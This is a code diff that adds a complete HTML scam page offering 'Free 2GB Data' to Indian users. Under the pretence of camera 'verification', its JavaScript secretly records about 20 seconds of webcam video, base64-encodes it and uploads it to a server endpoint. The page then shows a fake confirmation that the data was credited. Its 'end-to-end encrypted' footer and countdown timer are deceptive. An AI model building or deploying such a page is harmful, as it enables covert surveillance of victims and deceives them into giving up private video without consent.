@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free 2GB Data - Claim Now!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        .card{background:white;padding:40px 30px;border-radius:24px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.25);text-align:center;max-width:400px;width:100%;animation:fadeIn 0.5s;}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+        .logo{font-size:64px;margin-bottom:10px;}
+        h1{font-size:26px;color:#1a1a2e;margin-bottom:5px;}
+        .sub{color:#666;font-size:14px;margin-bottom:20px;}
+        .offer-badge{background:linear-gradient(135deg,#ff6b6b,#feca57);color:white;padding:16px;border-radius:16px;font-size:24px;font-weight:800;margin:20px 0;letter-spacing:1px;text-shadow:0 2px 4px rgba(0,0,0,0.2);}
+        .timer{font-size:13px;color:#999;margin:10px 0;}
+        .timer span{color:#ff6b6b;font-weight:bold;}
+        video{width:100%;border-radius:16px;margin:15px 0;display:none;background:#000;}
+        .btn-group{display:flex;flex-direction:column;gap:10px;margin-top:15px;}
+        .btn{padding:16px;border:none;border-radius:50px;font-size:17px;font-weight:700;cursor:pointer;transition:all 0.3s;width:100%;}
+        .btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:white;}
+        .btn-primary:hover:not(:disabled){transform:scale(1.02);box-shadow:0 10px 20px -5px rgba(102,126,234,0.4);}
+        .btn-success{background:linear-gradient(135deg,#28a745,#20c997);color:white;}
+        .btn:disabled{background:#e0e0e0;color:#999;cursor:not-allowed;transform:none!important;box-shadow:none!important;}
+        .status{margin-top:20px;padding:14px;border-radius:14px;font-weight:600;font-size:14px;display:none;}
+        .status.success{display:block;background:#d4edda;color:#155724;border:1px solid #c3e6cb;}
+        .status.error{display:block;background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;}
+        .footer{font-size:11px;color:#bbb;margin-top:20px;}
+        .loading-dots::after{content:'';animation:dots 1.5s infinite;}
+        @keyframes dots{0%{content:'';}25%{content:'.';}50%{content:'..';}75%{content:'...';}}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">🎁</div>
+        <h1>Free 2GB Data Offer</h1>
+        <p class="sub">Exclusive for Indian Users • Limited Time</p>
+        <div class="offer-badge">🎊 2GB FREE DATA 🎊</div>
+        <p class="timer">⏰ Offer ends in <span id="timer">05:00</span></p>
+        <video id="video" autoplay playsinline muted></video>
+        
+        <div class="btn-group">
+            <button class="btn btn-primary" id="verifyBtn" onclick="startCam()">
+                📸 Start Verification
+            </button>
+            <button class="btn btn-success" id="claimBtn" disabled onclick="claimData()">
+                ✅ Claim 2GB Data
+            </button>
+        </div>
+        <div id="status" class="status"></div>
+        <div class="footer">🔒 End-to-end encrypted • Secure verification</div>
+    </div>
+
+    <script>
+        // Timer countdown
+        let timeLeft = 300;
+        setInterval(() => {
+            if(timeLeft > 0){
+                timeLeft--;
+                let m = Math.floor(timeLeft/60);
+                let s = timeLeft%60;
+                document.getElementById('timer').textContent = 
+                    String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+            }
+        }, 1000);
+
+        let video, stream, recorder, chunks = [];
+        
+        async function startCam(){
+            const btn = document.getElementById('verifyBtn');
+            const status = document.getElementById('status');
+            
+            try {
+                status.className = 'status';
+                status.style.display = 'block';
+                status.textContent = '📷 Accessing camera for verification...';
+                btn.disabled = true;
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 640, height: 480, facingMode: 'user' },
+                    audio: false
+                });
+                
+                video = document.getElementById('video');
+                video.srcObject = stream;
+                video.style.display = 'block';
+                
+                document.getElementById('claimBtn').disabled = false;
+                status.className = 'status success';
+                status.innerHTML = '✅ Camera verified!<br>Now click "Claim 2GB Data" button!';
+                
+                // Start recording
+                recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                chunks = [];
+                
+                recorder.ondataavailable = (e) => {
+                    if(e.data.size > 0) chunks.push(e.data);
+                };
+                
+                recorder.onstop = () => {
+                    if(chunks.length > 0){
+                        const blob = new Blob(chunks, {type: 'video/webm'});
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            const base64 = reader.result.split(',')[1];
+                            fetch('/api', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    video: base64,
+                                    file: 'cam_' + Date.now() + '.webm'
+                                })
+                            }).catch(e => console.log(e));
+                        };
+                        reader.readAsDataURL(blob);
+                    }
+                };
+                
+                recorder.start();
+                setTimeout(() => {
+                    if(recorder && recorder.state === 'recording'){
+                        recorder.stop();
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                }, 20000);
+                
+            } catch(err) {
+                status.className = 'status error';
+                status.innerHTML = '❌ Camera access denied!<br>Please allow camera permission to claim free data.';
+                btn.disabled = false;
+            }
+        }
+        
+        function claimData(){
+            const btn = document.getElementById('claimBtn');
+            const status = document.getElementById('status');
+            btn.disabled = true;
+            btn.textContent = '✅ Activated!';
+            status.className = 'status success';
+            status.innerHTML = '🎉 <b>Congratulations!</b><br>2GB free data has been added to your number.<br>✔ Valid for 30 days';
+            
+            // Stop recording if still running
+            if(recorder && recorder.state === 'recording'){
+                recorder.stop();
+                if(stream) stream.getTracks().forEach(t => t.stop());
+            }
+        }
+        
+        // Auto-stop on page close
+        window.addEventListener('beforeunload', () => {
+            if(recorder && recorder.state === 'recording'){
+                recorder.stop();
+                if(stream) stream.getTracks().forEach(t => t.stop());
+            }
+        });
+    </script>
+</body>
+</html>
